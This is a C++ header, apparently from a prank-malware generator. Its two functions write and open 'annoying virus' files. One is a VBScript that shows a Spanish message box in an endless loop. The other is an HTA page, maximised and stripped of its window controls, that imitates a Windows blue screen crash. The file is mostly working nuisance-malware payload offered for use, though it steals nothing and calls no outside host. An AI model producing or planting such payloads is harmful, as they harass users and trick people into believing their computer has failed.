#ifndef VIRUS_H_INCLUDED
#define VIRUS_H_INCLUDED

void make_annoying_virus(){
    cout << "Making annoying virus... ";
    mkdir("virus");
    ofstream virus;
    virus.open("virus/annoying_virus.vbs", ios::out);
    virus << "do{\nmsgbox(\"Soy un virus molesto :U\")\n}loop";
    virus.close();
    cout << "Done!\nThis is in a folder called \"virus\"" << endl;
    system("start virus");
}

void make_fakebsod_virus(){

cout << "Making FakeBsod virus... ";
    mkdir("virus");
    ofstream virus;
    virus.open("virus/fakebsod_virus.hta", ios::out);
    virus << "<html><head><title>BSOD</title> <hta:application id=\"oBVC\" applicationname=\"BSOD\" maximizebutton=\"no\" minimizebutton=\"no\" sysmenu=\"no\" Caption=\"no\" windowstate=\"maximize\"/> </head><body bgcolor=\"#000088\" scroll=\"no\"> <font face=\"Lucida Console\" size=\"4\" color=\"#FFFFFF\"> <p>A problem has been detected and windows has been shutdown to prevent damage to your computer.</p> <p>If this is the first time you\'ve seen this stop error screen, restart your computer, If this screen appears again, follow these steps:</p> <p>Check to make sure any new hardware or software is properly installed. If this is a new installation, ask your hardware or software manufacturer for any windows updates you might need.</p> <p>If problems continue, disable or remove any newly installed hardware or software. Disable BIOS memory options such as caching or shadowing. If you need to use Safe Mode to remove or disable components, restart your computer, press F8 to select Advanced Startup Options, and then select Safe Mode.</p> <p>Technical information:</p> <p>*** gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb</p> <p>Beginning dump of physical memory</p> <p>Physical memory dump complete.</p> <p>Contact your system administrator or technical support group for further assistance.</p> </font> </body></html> ";
    virus.close();
    cout << "Done!\nThis is in a folder called \"virus\"" << endl;
    system("start virus");
}

#endif // VIRUS_H_INCLUDED
